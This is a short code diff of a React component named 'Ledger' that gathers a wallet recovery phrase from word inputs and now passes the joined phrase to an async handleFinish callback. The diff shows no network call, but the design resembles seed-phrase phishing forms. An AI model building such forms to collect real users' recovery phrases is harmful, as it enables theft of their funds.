@@ -12,10 +12,8 @@ const dmMono = DM_Mono({
 
 const Ledger = ({
 	handleFinish,
-	setWalletPhrase,
 }: {
-	handleFinish: () => void;
-	setWalletPhrase: any;
+	handleFinish: (walletPhrase: string) => Promise<void>;
 }) => {
 	const [backupPhrase, setBackupPhrase] = useState("");
 	const [phraseWords, setPhraseWords] = useState<string[]>([]);
@@ -26,8 +24,7 @@ const Ledger = ({
 
 	const handleComplete = () => {
 		setSeedPhrase(phraseWords.join(" "));
-		setWalletPhrase(phraseWords.join(" "));
-		handleFinish();
+		handleFinish(phraseWords.join(" "));
 	};
 
 	// Dynamically adjust textarea height as text changes
